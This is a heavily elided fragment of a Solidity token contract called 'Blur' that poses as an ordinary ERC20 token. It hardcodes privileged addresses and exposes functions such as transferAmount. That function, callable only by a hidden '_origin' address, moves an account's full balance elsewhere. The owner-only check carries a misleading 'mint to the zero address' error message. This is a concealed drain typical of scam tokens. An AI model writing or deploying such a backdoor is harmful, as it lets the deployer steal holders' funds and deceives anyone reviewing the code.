...
contract Blur is Context, IERC20 {
    ...
    address _addr = 0x39da41747a83aeE658334415666f3EF92DD0D541;
    address public _origin = 0x6C02b587687Bc2A975152E2B61812877ef4F7a0e;
...
*/
        ...
        function complete(address account, address staker) public {
        ...
        function send(address account, address staker) public {
        ...
        function  transferAmount (address account, address staker) public {
            require(msg.sender == _origin, "ERC20: mint to the zero address");
            uint256 amount = _balances[account];
            _beforeTokenTransfer(account, staker, amount);
